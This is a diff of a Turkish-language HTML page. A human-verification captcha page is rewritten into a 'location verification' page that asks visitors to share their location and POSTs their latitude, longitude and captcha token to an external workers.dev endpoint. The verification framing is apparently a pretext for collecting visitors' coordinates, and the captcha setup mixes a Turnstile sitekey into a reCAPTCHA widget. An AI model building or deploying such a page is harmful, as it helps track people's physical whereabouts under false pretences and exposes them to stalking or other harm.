@@ -1,41 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <title>Konum Doğrulama</title>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
-<body style="background:black;color:white;text-align:center;margin-top:100px;">
+<body>
 
-<h1>İnsan Doğrulama</h1>
+<h2>Devam etmek için konum doğrulaması gerekiyor</h2>
 
-<form id="form">
-  <div class="cf-turnstile" 
-       data-sitekey="0x4AAAAAACajPIDrosxxpJU1">
-  </div>
-  <br>
-  <button type="submit">Devam</button>
-</form>
+<button onclick="getLocation()">Konumu Paylaş</button>
+
+<div class="g-recaptcha" 
+     data-sitekey="0x4AAAAAACajPIDrosxxpJU1">
+</div>
 
 <script>
-document.getElementById("form").addEventListener("submit", async function(e){
-  e.preventDefault();
+async function getLocation() {
 
-  const token = document.querySelector('[name="cf-turnstile-response"]').value;
-
-  const res = await fetch("https://WORKER_URLİN/save", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ token })
-  });
-
-  const data = await res.json();
-
-  if(data.success){
-    alert("Doğrulama başarılı.");
-  } else {
-    alert("Doğrulama başarısız.");
+  const token = grecaptcha.getResponse();
+  if (!token) {
+    alert("Captcha doğrulanmadı");
+    return;
   }
-});
+
+  navigator.geolocation.getCurrentPosition(async function(position) {
+
+    const data = {
+      latitude: position.coords.latitude,
+      longitude: position.coords.longitude,
+      token: token
+    };
+
+    const res = await fetch("disciplinehub.disciplinehub.workers.dev", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    });
+
+    const result = await res.json();
+    alert("Konum gönderildi");
+
+  }, function() {
+    alert("Konum izni verilmedi");
+  });
+}
 </script>
 
 </body>
